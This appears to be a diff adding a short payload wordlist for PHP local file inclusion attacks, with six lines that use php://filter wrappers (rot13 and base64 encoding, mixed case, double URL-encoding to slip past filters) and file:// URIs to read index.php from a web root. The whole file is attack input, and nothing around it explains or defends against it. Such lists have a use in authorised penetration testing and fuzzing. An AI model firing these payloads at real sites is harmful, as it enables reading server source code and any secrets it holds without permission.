@@ -1,0 +1,6 @@
+php://filter/read=string.rot13/resource=index.php
+php://filter/convert.base64-encode/resource=index.php
+pHp://FilTer/convert.base64-encode/resource=index.php
+php:%252F%252Ffilter%252Fconvert.base64-encode%252Fresource=index.php
+file://localhost/var/www/html/index.php
+fiLe:///localhost/var/www/html/index.php
